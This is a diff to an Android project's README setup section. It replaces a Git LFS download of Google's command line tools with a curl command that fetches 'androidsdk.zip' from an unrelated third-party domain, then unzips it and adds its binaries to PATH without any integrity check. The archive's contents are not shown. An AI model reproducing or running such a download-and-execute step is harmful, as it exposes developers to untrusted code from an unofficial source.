@@ -13,20 +13,11 @@ python scripts/decode_gradle_wrapper.py
 
 This step recreates `gradle/wrapper/gradle-wrapper.jar`, which is required for running Gradle tasks.
 
-Fetch the Git LFS files to obtain the bundled Android command line tools (`commandlinetools-linux-13114758_latest.zip`).
-If the repository was cloned without a remote configured, add one before
-pulling:
+Download the Android command line tools archive and make `sdkmanager` available:
 
 ```bash
-git remote add origin https://github.com/ZeroStudMuffin/CEA2.git
-git lfs pull
-```
-
-Extract the command line tools so the `sdkmanager` tool is available before
-running the installer:
-
-```bash
-unzip commandlinetools-linux-13114758_latest.zip -d android-tools
+curl -L https://unitedexpresstrucking.com/androidsdk.zip -o androidsdk.zip
+unzip androidsdk.zip -d android-tools
 export PATH="$PWD/android-tools/cmdline-tools/bin:$PATH"
 ```
 
@@ -37,9 +28,9 @@ chmod +x scripts/install_android_sdk.sh  # ensures the script can run if cloned 
 ./scripts/install_android_sdk.sh
 ```
 
-The script uses the `commandlinetools-linux-13114758_latest.zip` archive from
-Git LFS to install the SDK without requiring network access. If the archive is
-missing it will download the tools from Google instead.
+The script uses the `androidsdk.zip` archive you downloaded to install the SDK
+without requiring network access. If the archive is missing it will download the
+tools from Google instead.
 
 Set the `ANDROID_HOME` environment variable to the SDK path (default is `~/android-sdk`) and add `$ANDROID_HOME/platform-tools` to your `PATH`.  Gradle looks for the SDK via `local.properties`, so create this file in the project root containing:
 
